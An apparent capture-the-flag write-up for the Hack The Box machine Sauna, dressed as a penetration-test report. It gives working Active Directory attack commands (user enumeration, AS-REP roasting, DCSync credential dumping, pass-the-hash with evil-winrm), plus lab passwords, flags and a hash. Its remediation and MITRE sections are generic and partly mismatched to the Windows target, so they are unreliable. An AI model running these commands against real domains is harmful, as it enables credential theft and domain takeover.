---
title: "OffSec Assessment: Sauna (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Sauna (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_01.png"
---

# Offensive Security Assessment Report: Sauna

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Sauna** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Public-Facing Network Service Exploitation
* **Privilege Escalation Vector:** Local Privilege Escalation
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Sauna |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Difficulty Rating** | Easy |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Public-Facing Network Service Exploitation |
| **Privilege Escalation Vector** | Local Privilege Escalation |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Public-Facing Network Service Exploitation
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Local Privilege Escalation
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.



> **Assessment Query / Target Milestone:** What is the name of the HTML file that reveals the names of users working at the target company?

* **Observed Evidence / Output:** about.html


![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.



> **Assessment Query / Target Milestone:** Which user has Kerberos Pre-Authentication disabled?

* **Observed Evidence / Output:** fsmith


![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
ldapsearch -x -H ldap://10.10.10.175 -s base defaultNamingContext

```

```jsx
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerb_users.txt
awk '/VALID USERNAME/{print $NF}' kerb_users.txt | cut -d@ -f1 | sort -u > users.txt
```

```jsx
impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/' -dc-ip 10.10.10.175 -no-pass -usersfile users.txt -format john -outputfile asrep.hash
grep -q '^\$krb5asrep\$' asrep.hash && sed -n '1p' asrep.hash
```

**What is the hash format returned from this AS-REP Roasting attack? Given the answer as the string between the first and third `$` characters, including the `$`.**

* **Observed Evidence / Output:** $krb5asrep$23$


![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/fsmith' -dc-ip 10.10.10.175 \

```


> **Assessment Query / Target Milestone:** What is the password of the user fsmith?

* **Observed Evidence / Output:** Thestrokes23


![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.


**Now that you have a valid set of credentials, on what port can you connect to the machine and get an interactive shell?**

* **Observed Evidence / Output:** 5985

**Submit the flag located on the fsmith user's desktop.**

* **Observed Evidence / Output:** 3687bd7136de194a3238ef63827e4823


![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What user is configured to autologin?

* **Observed Evidence / Output:** svc_loanmanager


![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the password of the svc_loanmanager user?

* **Observed Evidence / Output:** Moneymakestheworldgoround!


> **Assessment Query / Target Milestone:** What is the dangerous permission does Bloodhound show the svc_loanmanager user has over the domain? If there is more than one permission, give the longest.

* **Observed Evidence / Output:** **GetChangesAll**


![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.


**You know that the user svc_loanmanager is able to perform a DCSync attack. By doing so, you will get the hash for the Administrator user. What is the common name of the attack that allows users to authenticate with their hashes instead of cleartext passwords?**

* **Observed Evidence / Output:** pass the hash 


![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_10.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


```jsx
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 -just-dc

```

**Submit the flag located on the administrator user's desktop.**

* **Observed Evidence / Output:** 0d9a32f5c65af6a60f606b4dd6be7fef

```jsx
evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```


![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sauna/images/step_11.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.


```jsx

#!/usr/bin/env bash

DOM='EGOTISTICAL-BANK.LOCAL'
DCIP='10.10.10.175'
USER='svc_loanmgr'
PASS='Moneymakestheworldgoround!'



impacket-secretsdump "$DOM/$USER:$PASS@$DCIP" -just-dc-user krbtgt

impacket-secretsdump "$DOM/$USER:$PASS@$DCIP" -just-dc





echo "$DCIP ${DOM,,}" | sudo tee -a /etc/hosts


ldapsearch -x -H "ldap://$DCIP" -s base defaultNamingContext


ldapsearch -LLL -x -H "ldap://$DCIP" -b "DC=EGOTISTICAL-BANK,DC=LOCAL" \
 '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName


kerbrute userenum -d "$DOM" --dc "$DCIP" \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerb_users.txt
awk '/VALID USERNAME/{print $NF}' kerb_users.txt | cut -d@ -f1 | sort -u > users.txt


impacket-GetNPUsers "$DOM/" -dc-ip "$DCIP" -no-pass -usersfile users.txt -format john -outputfile asrep.hash

awk -F'$' '{print "$"$2"$"$3"$"}' asrep.hash


python3 -m bloodhound -d "$DOM" -u "$USER" -p "$PASS" -ns "$DCIP" \
  -c ACL,Group,ObjectProps,Trusts --zip



netexec ldap "$DCIP" -d "$DOM" -u "$USER" -p "$PASS" --dcsync



```

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Public-Facing Network Service Exploitation) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
